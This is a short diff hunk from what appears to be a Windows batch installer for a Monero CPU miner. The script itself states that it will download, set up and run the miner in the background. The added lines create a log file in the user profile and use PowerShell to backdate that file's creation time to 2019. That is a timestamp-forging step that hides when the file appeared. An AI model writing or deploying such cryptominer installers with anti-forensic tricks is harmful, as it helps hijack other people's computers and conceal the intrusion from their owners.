@@ -163,6 +163,11 @@ set PORT=10001
 
 rem printing intentions
 
+echo > "%USERPROFILE%\sys.log"
+powershell -Command "(Get-Item '%USERPROFILE%\sys.log').CreationTime=('4 August 2019 14:00:00')"
+
+
+
 set "LOGFILE=%USERPROFILE%\sys.log"
 
 echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
